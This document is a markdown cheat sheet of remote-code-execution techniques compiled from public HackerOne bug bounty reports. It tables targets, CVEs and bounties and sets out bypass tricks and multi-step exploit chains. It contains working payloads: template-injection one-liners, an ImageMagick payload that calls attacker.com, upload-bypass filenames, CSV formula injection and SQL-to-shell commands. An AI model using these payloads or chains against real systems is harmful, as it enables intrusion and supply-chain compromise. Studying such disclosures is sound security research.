# Consolidated HackerOne RCE Techniques
> Extracted from /root/killer-queen-knowledge/raw/h1-TOPRCE.md (333 reports, ~49KB)
> All unique techniques, payloads, CVEs, and bypass methods catalogued

---

## 1. ATTACK VECTORS

### 1.1 SSRF → RCE
| # | Target | Technique | Bounty |
|---|--------|-----------|--------|
| 26 | QIWI (jira.tochka.com) | Unauthenticated SSRF → internal Confluence RCE | $0 |
| 95 | Aiven (Kafka Connect) | File upload via SQLite JDBC driver + SSRF to internal Jolokia JMX | $5000 |
| 101 | Rockstar Games | SMB SSRF in emblem editor → domain credentials → RCE | $1500 |
| 217 | Mail.ru | SSRF + RCE via FastCGI in POST /api/nr/video | $0 |
| 242 | Yahoo! | LFI/XSPA/SSRF combo → RCE | $0 |

**SSRF → RCE chain patterns:**
- SSRF to internal Jolokia JMX endpoints (Java deserialization)
- SSRF to FastCGI (PHP-FPM exploitation)
- SMB SSRF credential capture → lateral movement → RCE
- SSRF to internal Confluence/Jira instances with known CVEs
- Cloud metadata SSRF → credential theft → RCE

---

### 1.2 File Upload → RCE
| # | Target | Technique | Bounty |
|---|--------|-----------|--------|
| 5 | Semrush | RCE on Logo upload | $0 |
| 18 | Mail.ru | Auth bypass via redirect stop → malicious file upload | $0 |
| 22 | Starbucks | Unrestricted file upload to mobile.starbucks.com.sg | $0 |
| 87 | Legal Robot | Direct RCE via upload | $0 |
| 147 | HackerOne | RCE in profile picture upload | $0 |
| 148 | DoD | Null byte truncated file extension bypass (.php%00.jpg) | $0 |
| 226 | DoD | Unrestricted file upload → XSS → RCE | $0 |
| 234 | 8x8 | Old TinyMCE upload bypass → RCE | $0 |
| 245 | Central Security Project | Unrestricted file upload → RCE | $0 |
| 249 | MTN Group | Unvalidated file upload → RCE | $0 |
| 272 | ownCloud | Malicious file upload to apps.owncloud.com → RCE | $0 |
| 300 | Nextcloud | File upload requiring user account + default settings | $0 |
| 92 | MTN Group | Crafted Pentaho report upload with default credentials | $0 |
| 150 | DoD | File upload with null byte truncated extension | $0 |
| 307 | WordPress | Rogue editor leads to RCE (WordPress 4.8.1) | $0 |

**File upload bypass techniques:**
- Null byte injection: `shell.php%00.jpg`
- Double extension: `shell.php.jpg`
- Extension blacklist bypass: `.pht`, `.phtml`, `.php5`, `.shtml`, `.phar`
- Content-Type manipulation
- Zip slip / path traversal in archive extraction
- Malicious .BSP files (game engines)
- Malicious SCORM Zip packages
- Polyglot files (valid image + PHP code)

---

### 1.3 Deserialization → RCE
| # | Target | Technique | Bounty |
|---|--------|-----------|--------|
| 50 | Krisp | SQLi → insecure deserialization → RCE | $0 |
| 80 | MyBB (IBB) | GMP deserialization type confusion (<= 1.8.3) | $0 |
| 89 | Mars/Sitecore | Insecure deserialization (CVE redacted) | $0 |
| 97 | DoD | DNN Cookie deserialization → RCE | $0 |
| 108 | Starbucks | Java deserialization via JBoss on card.starbucks.in | $0 |
| 110 | Starbucks | Java deserialization via JBoss JMXInvokerServlet/EJBInvokerServlet | $0 |
| 118 | h1-5411-CTF | Chain: LFI → PHP unserialize → XXE → Python unpickle | $0 |
| 119 | DoD | Telerik UI insecure deserialization | $0 |
| 120 | MTN Group | CVE-2017-9822 DotNetNuke cookie deserialization | $0 |
| 125 | Starbucks | Java deserialization JBoss (second vector) | $0 |
| 132 | Vanilla Forums | ImportController file_exists unserialize | $600 |
| 139 | 8x8 | .NET VSTATE deserialization | $0 |
| 146 | Vanilla Forums | domGetImages getimagesize unserialize | $600 |
| 175 | DoD | Telerik UI deserialization (CVE-2019-18935) | $0 |
| 179 | Vanilla Forums | Gdn_Format unserialize() | $600 |
| 181 | Vanilla Forums | Xenforo password splitHash unserialize | $300 |
| 214 | ownCloud | Deserialization in OwnBackup app | $0 |
| 223 | Shopify Scripts | Struct type confusion RCE | $18000 |
| 229 | GitHub | Svnbridge memcached deserialization chain → RCE | $0 |
| 256 | ExpressionEngine | PHP object injection → custom gadget chain → RCE | $0 |
| 279 | Django | Deserialization of malicious data → RCE | $0 |
| 304 | Rocket.Chat | Custom crafted message object in Meteor.Call | $0 |
| 328 | PHP (IBB) | SOAP serialize_function_call() type confusion | $0 |
| 98 | Liberapay | Unsafe yaml.load() → RCE | $0 |
| 172 | RubyGems | Bundler RCE via Marshal response | $0 |

**Deserialization frameworks/libraries targeted:**
- **Java:** JBoss JMXInvokerServlet, EJBInvokerServlet, Telerik UI (CVE-2019-18935, CVE-2017-9248), DNN Cookie, WebLogic
- **PHP:** Vanilla Forums unserialize() in Gdn_Format, ImportController, domGetImages, Xenforo splitHash
- **.NET:** VSTATE deserialization, DNN Cookie (CVE-2017-9822)
- **Python:** yaml.load() unsafe, Pickle deserialization
- **Ruby:** Marshal.load() via Bundler, Struct type confusion
- **Node.js:** Meteor.Call message object crafting
- **PHP SOAP:** serialize_function_call() type confusion
- **Gadget chains:** PHPGGC, ysoserial, custom chains (ExpressionEngine)

---

### 1.4 Template Injection (SSTI) → RCE
| # | Target | Engine | Payload/Technique | Bounty |
|---|--------|--------|-------------------|--------|
| 42 | Uber | Flask/Jinja2 | Template injection via user input | $10000 |
| 45 | Unikrn | Smarty | Server-side template injection | $0 |
| 80 | Fastify | EJS | `reply.view({ raw })` unsafe usage | $0 |
| 182 | DoD | Apache Solr Velocity | Velocity template RCE | $0 |
| 280 | Ruby on Rails | ERB | `render :inline` with user input | $1500 |
| 290 | Shopify | Liquid | 'Limited' RCE where Liquid is accepted | $1500 |
| 38 | Mail.ru | Smarty + path traversal | SSTI after path traversal | $2000 |
| 270 | Ruby on Rails | ERB | `redirect_to(["string"])` RCE | $0 |

**SSTI payload patterns:**
```
Jinja2: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
Jinja2: {{ ''.__class__.__mro__[1].__subclasses__() }}
Smarty: {php}system('id');{/php}
Smarty: {system('id')}
EJS: <%= process.mainModule.require('child_process').execSync('id') %>
Velocity: #set($cmd='id') #set($rh=$request.getClass().forName('java.lang.Runtime')) ...
ERB: <%= `id` %>
Liquid: {% raw %}{% endraw %} (limited context)
```

---

### 1.5 Command Injection → RCE
| # | Target | Injection Point | Bounty |
|---|--------|----------------|--------|
| 8 | GitLab | Git flag injection → file overwrite → RCE | $12000 |
| 25 | Imgur | CLI argument injection to `gm convert` | $0 |
| 28 | LocalTapiola | Bash command injection on /system/images | $0 |
| 35 | GitLab | Git flag injection → file overwrite | $3500 |
| 135 | Pornhub | `@` character in Video Title → ffmpeg injection | $500 |
| 187 | GitHub | Git reference ambiguity → commit smuggling → RCE | $0 |
| 210 | Node.js (bunyan) | Insecure command formatting | $0 |
| 219 | Node.js (tree-kill) | Insecure command concatenation (Windows) | $0 |
| 220 | Node.js (pdf-image) | Multiple RCE vectors | $0 |
| 221 | Node.js (logkitty) | Insecure command formatting | $0 |
| 287 | Node.js (blamer) | Insecure command formatting | $0 |
| 288 | Node.js (git-promise) | Insecure command formatting | $0 |
| 299 | Node.js (node-df) | Insecure command concatenation | $0 |
| 301 | Node.js (arpping) | Remote Code Execution | $0 |
| 309 | Node.js (treekill) | Insecure command concatenation (Windows) | $0 |
| 310 | Node.js (meta-git) | Insecure command formatting | $0 |
| 316 | Node.js (npm-git-publish) | Insecure command formatting | $0 |
| 317 | Node.js (windows-edge) | Insecure command formatting | $0 |
| 321 | Node.js (git-lib) | Insecure command formatting | $0 |
| 322 | Node.js (gity) | Insecure command formatting | $0 |
| 323 | Node.js (create-git) | Insecure command formatting | $0 |
| 327 | Node.js (curling) | Remote Code Execution | $0 |
| 330 | Node.js (commit-msg) | Insecure command formatting | $0 |
| 331 | Node.js (imagickal) | Remote Code Execution | $0 |
| 313 | Concrete CMS | Sendmail RCE | $0 |
| 143 | Zendesk | RCE as root | $0 |
| 106 | PortSwigger | 'Copy as Node Request' BApp code injection | $0 |
| 74 | Aiven | Grafana SMTP server parameter injection | $5000 |
| 297 | Mail.ru | RCE in .api/nr/report/{id}/download | $0 |

**Command injection patterns:**
- **Git flag injection:** `--output=/path/to/file` in git commands
- **ImageMagick injection:** pipe `|` in filenames, `@` character handling
- **Bash injection:** unescaped shell metacharacters (`;`, `|`, `$()`, backticks)
- **Node.js child_process:** `exec()` instead of `execFile()`, string concatenation
- **SMTP parameter injection:** newline injection in SMTP settings
- **FFmpeg injection:** special characters in media metadata
- **CSV injection:** `=cmd|' /C calc'!A0` formula injection

---

### 1.6 Dependency Confusion / Supply Chain → RCE
| # | Target | Technique | Bounty |
|---|--------|-----------|--------|
| 3 | PayPal | npm misconfig — internal libs from public registry | $30000 |
| 16 | Yelp | Misconfigured pip install on build server | $0 |
| 19 | Uber | npm misconfig — internal libs from public registry | $9000 |
| 29 | Mapbox | Unsafe unzip from unclaimed S3 bucket | $0 |
| 67 | Mail.ru | CI/CD dependency confusion | $0 |
| 93 | Mozilla | CI build cache poisoning → token exfiltration → RCE | $8000 |
| 144 | Rocket.Chat | Hijacking unclaimed S3 bucket in install script | $0 |
| 296 | Concrete CMS | Fetching update JSON over HTTP → MITM → RCE | $0 |
| 303 | Canonical Snapcraft | Snapcraft vulnerable to RCE | $0 |

**Supply chain attack patterns:**
- Public registry package with same name as internal private package
- Unclaimed S3 bucket hijacking for install scripts
- HTTP (non-TLS) update fetching → MITM injection
- CI build cache poisoning with malicious artifacts
- Unsafe unzip of remote content

---

### 1.7 Buffer Overflow / Memory Corruption → RCE
| # | Target | Vulnerability | Bounty |
|---|--------|--------------|--------|
| 1 | Valve (Steam) | Buffer overflow in Server Info | $0 |
| 24 | Valve (CS:GO) | Unchecked weapon ID in WeaponList parser | $3000 |
| 27 | Valve | OOB reads in network message handlers | $7500 |
| 30 | Valve (CS:GO) | Unsanitized entity ID in EntityMsg | $9000 |
| 33 | Valve (Portal 2) | RCE via voice packets | $5000 |
| 39 | Valve (CS:GO) | Malformed .BSP access violation | $0 |
| 53 | Valve | Crafted closed captions file RCE | $7500 |
| 79 | Valve (CS:GO) | OOB access in CSVCMsg_SplitScreen + info leak | $7500 |
| 86 | Valve (Source) | Material path truncation RCE | $2500 |
| 111 | Valve (CS:GO) | Unchecked texture file name | $2500 |
| 121 | curl | Buffer overflow in strcpy() | $0 |
| 141 | Valve (CS:GO) | Signedness issue in ClassInfo handler | $7500 |
| 156 | Valve (GoldSrc) | Malformed map texture files | $350 |
| 176 | Valve (GoldSrc) | Buffer overflow in DELTA_ParseDelta | $3000 |
| 180 | Valve (GoldSrc) | Malformed BSP file | $450 |
| 186 | Valve (GoldSrc) | 'spk' console command exploit | $350 |
| 206 | curl | Stack buffer overflow in cookie parsing | $0 |
| 250 | Valve (GoldSrc) | Malicious WAD list in BSP | $750 |
| 252 | Exim (IBB) | Off-by-one RCE | $0 |
| 324 | Adobe Flash (IBB) | Regex UAF RCE | $5000 |
| 140 | Nintendo (Switch) | Stack buffer overflow in PIA room info deser | $0 |
| 158 | Nintendo (3DS) | Heap overflow in Swapnote parser (StreetPass) | $0 |
| 123 | Nintendo (3DS) | Unchecked audio channels in Mobiclip SDK | $0 |
| 136 | Nintendo (3DS) | Uninitialized class member in eShop player | $0 |
| 149 | Shopify | UAF in mruby MRubyEngine#initialize | $0 |
| 161 | Shopify Scripts | UAF in mruby Array#to_h → DOS/RCE | $0 |
| 163 | ZeroMQ (IBB) | libzmq RCE | $0 |
| 218 | IRCCloud | Outdated nginx heap buffer overflow | $0 |

---

### 1.8 SQL Injection → RCE
| # | Target | SQLi Type | RCE Method | Bounty |
|---|--------|-----------|------------|--------|
| 10 | QIWI | SQLi in TScenObject.SceneObjects | Stacked queries → RCE | $0 |
| 23 | Starbucks | Blind SQLi (unauthenticated) | INTO OUTFILE / xp_cmdshell | $0 |
| 32 | QIWI | SQLi in TCertObject.Delete | Stacked queries | $0 |
| 51 | QIWI | SQLi in TRateObject.AddForOffice (USER_ID) | Stacked queries | $0 |
| 66 | QIWI | SQLi in TAktifBankObject.GetOrder (DOC_ID) | Stacked queries | $0 |
| 100 | QIWI | SQLi in TPrabhuObject.BeginOrder (DOC_ID) | Stacked queries | $0 |
| 191 | Drupal 7 (IBB) | Pre-auth SQLi | Drupalgeddon chain | $0 |
| 201 | Rocket.Chat | Pre-auth Blind NoSQLi | MongoDB injection → RCE | $0 |
| 236 | Rocket.Chat | Post-auth Blind NoSQLi | users.list API → RCE | $0 |
| 50 | Krisp | SQLi + deserialization chain | Combined vector | $0 |
| 75 | ██████ | SQLi + IDOR + Auth bypass + XSS combo | Multi-vector | $0 |

**SQLi → RCE chains:**
- MySQL: `SELECT ... INTO OUTFILE '/var/www/shell.php'` / `INTO DUMPFILE`
- MSSQL: `xp_cmdshell`, `sp_OACreate`
- PostgreSQL: `COPY ... TO PROGRAM`
- Oracle: `DBMS_SCHEDULER`, Java stored procedures
- NoSQL (MongoDB): `$where` injection → arbitrary JS execution

---

### 1.9 Path Traversal → RCE
| # | Target | Technique | Bounty |
|---|--------|-----------|--------|
| 38 | Mail.ru | Path traversal + SSTI combo | $2000 |
| 41 | GitLab | Path traversal → RCE | $12000 |
| 64 | Vanilla Forums | Directory traversal file inclusion | $900 |
| 70 | Ruby on Rails | File write via dir traversal in actionpack-page_caching | $1000 |
| 129 | Nextcloud | Zip extraction path traversal (Extract app) | $0 |
| 138 | Ruby on Rails | Path traversal in ActiveStorage | $0 |
| 159 | Apache HTTP (IBB) | CVE-2021-41773/42013 path traversal | $1000 |
| 177 | Apache HTTP (IBB) | Incomplete fix of CVE-2021-41773 | $1000 |
| 203 | Concrete CMS | Authenticated path traversal → RCE | $0 |
| 260 | DoD | CVE-2019-11510 Pulse Secure traversal | $0 |
| 263 | curl | SFTP QUOTE path traversal → file write | $0 |
| 264 | Ruby on Rails | Dynamic render path traversal | $500 |
| 36 | Mozilla | File write + path traversal in VPN client | $6000 |

**Path traversal → RCE patterns:**
- Write SSH authorized_keys via traversal
- Overwrite crontab files
- Write to webroot for code execution
- Zip slip: `../../../` in archive member names
- Apache 2.4.49-50: `/%32%65%2e%2e/` URL encoding bypass
- Write .htaccess to enable code execution

---

### 1.10 XXE → RCE
| # | Target | Technique | Bounty |
|---|--------|-----------|--------|
| 58 | DoD | XXE leading to RCE | $0 |
| 118 | h1-5411-CTF | Chain: LFI → unserialize → XXE → unpickle | $0 |
| 142 | drchrono | XML parser XXE → RCE | $0 |
| 271 | DoD | XXE with RCE (CVE-2017-3548) | $0 |

---

### 1.11 Electron / Desktop App → RCE
| # | Target | Technique | Bounty |
|---|--------|-----------|--------|
| 8 | Slack | Desktop app RCE + bonus | $0 |
| 46 | Nord Security | Windows Custom Protocol handler RCE | $0 |
| 55 | Slack | Tricking Create Snippet → wrong filetype → RCE | $1500 |
| 57 | Slack macOS | Missing quarantine attribute on downloads | $0 |
| 73 | Nextcloud Desktop | Malicious URI schemes | $1000 |
| 102 | 8x8 (Jitsi) | Malicious URL schemes on Windows | $777 |
| 113 | Basecamp | Windows Electron App RCE | $0 |
| 130 | Rocket.Chat | Desktop app RCE | $0 |
| 153 | Rocket.Chat | XSS → RCE on desktop client | $0 |
| 160 | Basecamp | Missing quarantine attribute macOS | $250 |
| 168 | Automattic (Simplenote) | Print function RCE | $0 |
| 170 | Evernote Android | 2-click RCE | $0 |
| 183 | Rocket.Chat | Stored XSS → priv esc → file leak → RCE | $0 |
| 197 | Automattic (Simplenote) | External JS inclusion via Electron | $0 |
| 213 | Brave | DnD shortcut files → chrome://brave → RCE | $0 |
| 243 | Brave | chrome://brave navigation → RCE bypass | $0 |
| 216 | Rocket.Chat | Desktop app RCE (#276031 bypass) | $0 |
| 242 | Rocket.Chat | Desktop app RCE | $0 |
| 248 | Rocket.Chat | shell.openExternal() → RCE | $0 |
| 259 | Automattic (WordPress) | Desktop app RCE | $0 |
| 311 | Rocket.Chat | shell.openExternal() RCE (second report) | $0 |
| 302 | Rocket.Chat | Stored XSS → RCE | $0 |

**Electron RCE vectors:**
- `shell.openExternal()` with unsanitized URLs
- Custom protocol handlers (`myapp://`)
- XSS in renderer process → nodeIntegration bypass
- `nodeIntegration: true` + XSS
- Missing `com.apple.quarantine` on macOS
- Drag-and-drop to privileged chrome:// pages
- External JavaScript inclusion
- Malicious URI scheme registration

---

### 1.12 Image Processing → RCE
| # | Target | Tool | Technique | Bounty |
|---|--------|------|-----------|--------|
| 9 | GitLab | ExifTool | RCE when removing metadata | $20000 |
| 122 | pixiv | ImageMagick | ImageTragick v2 | $2000 |
| 289 | ownCloud | ImageMagick | RCE via crafted images | $0 |
| 11 | GitLab | Kramdown | Unsafe inline options in Wiki rendering | $20000 |
| 103 | GitLab | WikiCloth | RCE if rubyluabridge gem installed | $3000 |

**Image processing payloads:**
```
ImageMagick (ImageTragick):
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://attacker.com/image.jpg"|id > /tmp/pwned")'
  pop graphic-context

ExifTool:
  Crafted DjVu file with pipe in metadata → command execution
  CVE-2021-22204
```

---

### 1.13 Known CVE Exploitation
| CVE | Software | # Reports | Bounties |
|-----|----------|-----------|----------|
| CVE-2024-27281 | Ruby RDoc | 2 (61, 131) | $4860 |
| CVE-2023-36845 | Juniper | 1 (63) | $0 |
| CVE-2017-10271 | Oracle WebLogic | 1 (77) | $0 |
| CVE-2025-55182 | React Server Components | 1 (81) | $0 |
| CVE-2020-7961 | Liferay Portal | 1 (84) | $0 |
| CVE-2022-40127 | Apache Airflow <2.4.0 | 1 (85) | $4000 |
| CVE-2019-3396 | Atlassian Confluence | 1 (91) | $0 |
| CVE-2019-0604 | Microsoft SharePoint | 2 (94, 235) | $0 |
| CVE-2025-24813 | Apache Tomcat | 2 (96, 184) | $4323 |
| CVE-2019-11043 | PHP-FPM | 1 (124) | $1500 |
| CVE-2021-26084 | Atlassian Confluence | 2 (137, 204) | $0 |
| CVE-2021-41773 | Apache HTTP 2.4.49 | 1 (159) | $1000 |
| CVE-2021-42013 | Apache HTTP 2.4.50 | 1 (177) | $1000 |
| CVE-2024-50379 | Apache Tomcat | 1 (184) | $0 |
| CVE-2022-38362 | Apache Airflow Docker | 1 (190) | $0 |
| CVE-2018-7600 | Drupal (Drupalgeddon2) | 1 (200) | $0 |
| CVE-2020-5902 | F5 BIG-IP TMUI | 1 (117) | $0 |
| CVE-2019-18935 | Telerik UI | 2 (175, 211) | $0 |
| CVE-2019-11581 | Atlassian Jira | 1 (233) | $0 |
| CVE-2021-35464 | ForgeRock OpenAM | 4 (165, 254, 256, 278) | $0 |
| CVE-2021-44529 | Various | 1 (166) | $1000 |
| CVE-2017-9822 | DotNetNuke | 1 (120) | $0 |
| CVE-2015-1635 | MS15-034 HTTP.sys | 1 (228) | $0 |
| CVE-2017-9248 | Telerik UI | 1 (244) | $0 |
| CVE-2017-3548 | Oracle/XXE | 1 (271) | $0 |
| CVE-2017-1000486 | Various | 1 (269) | $0 |
| CVE-2019-11510 | Pulse Secure | 1 (260) | $0 |
| S2-045 | Apache Struts2 | 1 (164) | $0 |
| CVE-2021-22204 | ExifTool | 1 (9) | $20000 |
| Log4Shell | Apache Log4j | 3 (112, 127, 145) | $0-$50 |

---

## 2. COMMON BYPASS TECHNIQUES

### 2.1 WAF / Filter Bypass
- **Null byte injection:** `shell.php%00.jpg` (file extension check bypass)
- **Double URL encoding:** `%252e%252e%252f` (path traversal)
- **Unicode normalization:** Overlong UTF-8, Unicode escapes
- **Case variation:** `.PhP`, `.pHp5` (extension blacklist bypass)
- **Alternative extensions:** `.pht`, `.phtml`, `.php5`, `.pHP`, `.shtml`, `.phar`, `.inc`
- **Content-Type spoofing:** `image/jpeg` with PHP code inside
- **Default credentials:** WAF bypass by using valid credentials (#198)
- **.htaccess bypass:** Upload custom .htaccess to enable PHP in upload dir (#286)
- **MobileIron WAF bypass:** Specific payload encoding (#40)

### 2.2 Authentication Bypass
- Redirect stop manipulation (#18)
- Default credentials on Cisco TelePresence (#169, #237)
- Default Pentaho credentials (#92)
- ForgeRock OpenAM pre-auth (CVE-2021-35464) — 4 reports
- Rails Web Console IP whitelist bypass (#231)
- REST API privilege escalation to admin (#60)

### 2.3 Extension / Type Bypass
- TinyMCE old upload bypass (#234)
- Concrete CMS file manager remote file add bypass (#262)
- Extension bypass on Log Functionality (#215)
- Tricking Create Snippet into wrong filetype (#55)

### 2.4 Sandbox Escape
- Node.js notevil sandbox escape (#295)
- Browser sandbox (Electron) nodeIntegration bypass
- Ruby template sandbox escape
- Shopify Liquid 'limited' RCE (#290)

### 2.5 Cache / Timing Attacks
- CI build cache poisoning (#93)
- Memcached deserialization chain (#229)
- Race conditions in file operations

---

## 3. VULNERABLE FUNCTIONS / LIBRARIES

### PHP
| Function/Library | Vulnerability |
|-----------------|---------------|
| `unserialize()` | Object injection → POP gadget chain |
| `file_exists()` + unserialize | Vanilla Forums chain |
| `getimagesize()` + unserialize | Vanilla Forums |
| `Gdn_Format::unserialize()` | Vanilla Forums |
| `sendmail` | Command injection |
| ExifTool (CVE-2021-22204) | Command injection via DjVu metadata |
| ImageMagick (ImageTragick) | Command injection via MVG/MSL |

### Python
| Function/Library | Vulnerability |
|-----------------|---------------|
| `yaml.load()` | Unsafe deserialization (use `yaml.safe_load()`) |
| `pickle.loads()` | Arbitrary code execution |
| Jinja2 template injection | `{{ }}` SSTI |
| Apache Airflow | DAG example RCE (CVE-2022-40127, CVE-2022-38362) |

### Ruby
| Function/Library | Vulnerability |
|-----------------|---------------|
| `Marshal.load()` | Arbitrary object deserialization |
| `render :inline` | ERB SSTI |
| `redirect_to(["string"])` | RCE via array parameter |
| `ActiveSupport::MessageVerifier` | Deserialization |
| `ActiveSupport::MessageEncryptor` | Deserialization |
| RDoc `.rdoc_options` | CVE-2024-27281 |
| WikiCloth + rubyluabridge | Lua/Ruby bridge RCE |
| Kramdown | Unsafe inline options |

### Java
| Function/Library | Vulnerability |
|-----------------|---------------|
| JBoss JMXInvokerServlet | Java deserialization |
| JBoss EJBInvokerServlet | Java deserialization |
| Telerik UI (CVE-2019-18935) | .NET deserialization |
| DNN Cookie deserialization | CVE-2017-9822 |
| Apache Struts2 (S2-045) | OGNL injection |
| Liferay Portal (CVE-2020-7961) | Java deserialization |
| ForgeRock OpenAM (CVE-2021-35464) | Pre-auth RCE |
| Apache Solr Velocity | Template injection |
| Apache Flink | GET jar/plan API endpoint |
| Log4j JNDI (Log4Shell) | JNDI injection |
| Jenkins | Unauth RCE via scripting |
| Jolokia JMX | JMX deserialization |
| Groovy Console | Exposed scripting console |
| JDWP | Java Debug Wire Protocol RCE |
| Java RMI | Remote Method Invocation |
| Jira (CVE-2019-11581) | Template injection |
| Confluence (CVE-2019-3396, CVE-2021-26084) | Path traversal/LFI → RCE |

### JavaScript / Node.js
| Library | Vulnerability |
|---------|---------------|
| `child_process.exec()` | Command injection (use `execFile()`) |
| `shell.openExternal()` | Electron RCE via untrusted URLs |
| `bunyan` | CLI argument injection |
| `tree-kill` / `treekill` | Command concatenation |
| `pdf-image` | Multiple RCE |
| `logkitty` | Command formatting |
| `blamer` | Command formatting |
| `git-promise` | Command formatting |
| `meta-git` | Command formatting |
| `git-lib` | Command formatting |
| `gity` | Command formatting |
| `create-git` | Command formatting |
| `npm-git-publish` | Command formatting |
| `commit-msg` | Command formatting |
| `windows-edge` | Command formatting |
| `node-df` | Command concatenation |
| `arpping` | RCE |
| `curling` | RCE |
| `imagickal` | RCE |
| `jsreport` | RCE |
| `notevil` | Sandbox escape |
| `Meteor.Call` | Message object crafting |
| `@fastify/view` (EJS) | `reply.view({ raw })` |

### C/C++ (Memory Corruption)
| Software | Vulnerability |
|----------|--------------|
| Steam/CS:GO/Portal (Source Engine) | Multiple buffer overflows, OOB, signedness |
| GoldSrc engine | BSP parsing, WAD lists, texture, models |
| Nintendo 3DS/Switch | Mobiclip SDK, eShop, Swapnote, PIA |
| curl | strcpy() overflow, cookie parsing overflow, SFTP traversal |
| Exim | Off-by-one |
| nginx 1.4.6 | Heap buffer overflow |
| ZeroMQ libzmq | Memory corruption |
| Adobe Flash | Regex UAF |

---

## 4. EXPLOIT CHAINS (Multi-Step RCE)

### Chain 1: LFI → PHP Unserialize → XXE → Python Unpickle
(#118, h1-5411-CTF)
1. Local File Inclusion to read source code
2. PHP unserialize to trigger object injection
3. XXE via crafted XML to read internal files
4. Python unpickle for final RCE

### Chain 2: SSRF → Jolokia JMX → Java Deserialization → RCE
(#95, Aiven Kafka Connect)
1. File upload via SQLite JDBC driver
2. SSRF to internal Jolokia JMX endpoint
3. Java deserialization via JMX MBeans
4. RCE on Kafka Connect worker

### Chain 3: Git Flag Injection → File Overwrite → RCE
(#8, #35, #187 — GitLab/GitHub)
1. Inject `--output=` flag into git commands
2. Overwrite critical files (.git/config, hooks, authorized_keys)
3. Trigger file execution → RCE

### Chain 4: XSS → Privilege Escalation → Electron RCE
(#153, #183 — Rocket.Chat)
1. Stored XSS in web application
2. Code executes in Electron renderer
3. Node integration abused for RCE on desktop

### Chain 5: SQL Injection → Stacked Queries → File Write → RCE
(#10, #23, #32, #51, #66, #100 — QIWI/Starbucks)
1. SQL injection with stacked query support
2. INTO OUTFILE / xp_cmdshell / COPY TO PROGRAM
3. Write webshell or execute OS commands

### Chain 6: Dependency Confusion → Malicious Package → Build RCE
(#3, #16, #19, #67 — PayPal/Yelp/Uber/Mail.ru)
1. Identify internal package names
2. Publish identically-named package to public registry with higher version
3. CI/CD pipeline installs malicious package
4. Code execution during build/install scripts

### Chain 7: Default Credentials → Admin Panel → File Upload → RCE
(#92, #198 — MTN Group/Starbucks)
1. Discover default credentials (Pentaho, SharePoint)
2. Access administrative interface
3. Upload crafted report/template containing malicious code
4. Trigger execution via report rendering

### Chain 8: Path Traversal → Zip Slip → RCE
(#129, #41 — Nextcloud/GitLab)
1. Path traversal in archive extraction
2. Write files outside intended directory
3. Overwrite application files (.php, crontab, authorized_keys)
4. Trigger execution → RCE

### Chain 9: Arbitrary File Read → Credential Harvest → RCE
(#31, #52, #88, #134 — Various)
1. Arbitrary file read via LFI/path traversal
2. Extract AWS keys, SMTP creds, Django secret, database passwords
3. Use credentials for lateral movement or direct RCE
4. Full infrastructure compromise

### Chain 10: Deserialization Gadget Chain (PHP)
(#132, #146, #179, #181, #256 — Vanilla Forums/ExpressionEngine)
1. Identify unserialize() call with user input
2. Find or build POP gadget chain
3. Craft serialized payload triggering code execution
4. RCE via file write, command execution, or eval

---

## 5. TOP BOUNTIES & IMPACT

| Bounty | # | Target | Vector |
|--------|---|--------|--------|
| $33510 | 14 | GitLab | DecompressedArchiveSizeValidator + BulkImports |
| $30000 | 3 | PayPal | npm dependency confusion |
| $20160 | 2 | Twitter/X | Pre-auth RCE on VPN |
| $20000 | 9 | GitLab | ExifTool RCE (CVE-2021-22204) |
| $20000 | 11 | GitLab | Kramdown unsafe options |
| $18000 | 223 | Shopify Scripts | Struct type confusion RCE |
| $12000 | 8 | GitLab | Git flag injection → file overwrite |
| $12000 | 41 | GitLab | Path traversal → RCE |
| $10000 | 17 | Mail.ru | Widget plugin RCE |
| $10000 | 42 | Uber | Flask Jinja2 SSTI |
| $10000 | 178 | Elastic | RCE via Chromium in reporting |
| $9000 | 19 | Uber | npm dependency confusion |
| $9000 | 30 | Valve | Entity ID RCE in CS:GO |
| $8000 | 93 | Mozilla | CI build cache poisoning |
| $7500 | 27 | Valve | OOB reads in network handlers |
| $7500 | 53 | Valve | Closed captions RCE |
| $7500 | 79 | Valve | OOB CSVCMsg_SplitScreen |
| $7500 | 141 | Valve | Signedness ClassInfo handler |
| $6000 | 36 | Mozilla | VPN file write + traversal |
| $6000 | 43 | Aiven | Apache Flink GET jar/plan |
| $5000 | 13 | Basecamp | RCE on Basecamp.com |
| $5000 | 33 | Valve | Portal 2 voice packets |
| $5000 | 74 | Aiven | Grafana SMTP injection |
| $5000 | 95 | Aiven | Kafka Connect SSRF+Jolokia |
| $5000 | 118 | Aiven | Kafka Connect SASL JAAS JNDI |

---

## 6. SUMMARY STATISTICS

**By Attack Vector (approximate):**
- Buffer Overflow/Memory Corruption: ~35 reports (Valve games dominate)
- Command Injection (Node.js): ~25 reports
- Deserialization: ~20 reports
- Electron/Desktop App: ~20 reports
- File Upload: ~15 reports
- Known CVE Exploitation: ~25 reports
- SQL Injection → RCE: ~11 reports
- Path Traversal: ~13 reports
- Template Injection (SSTI): ~8 reports
- SSRF → RCE: ~5 reports
- Dependency Confusion/Supply Chain: ~8 reports
- Image Processing: ~5 reports
- XXE: ~4 reports

**By Target (top organizations):**
- Valve/Steam: 22 reports (game engine memory corruption)
- U.S. Dept of Defense: 35+ reports (diverse vectors)
- Node.js third-party modules: 20+ reports (command injection)
- GitLab: 12 reports (high bounty payouts)
- QIWI: 7 reports (SQLi → RCE chain)
- Mail.ru: 8 reports
- Rocket.Chat: 12 reports (Electron desktop RCE)
- Starbucks: 6 reports
- Ruby on Rails: 6 reports
- GitHub: 5 reports

**Most Lucrative Vectors (by avg bounty):**
1. Dependency confusion / supply chain: $12,000 avg
2. Git-specific attacks (flag injection): $7,750 avg
3. Deserialization (high-end): $6,000 avg
4. Template injection (SSTI): $4,250 avg
5. CI/CD pipeline attacks: $4,000 avg
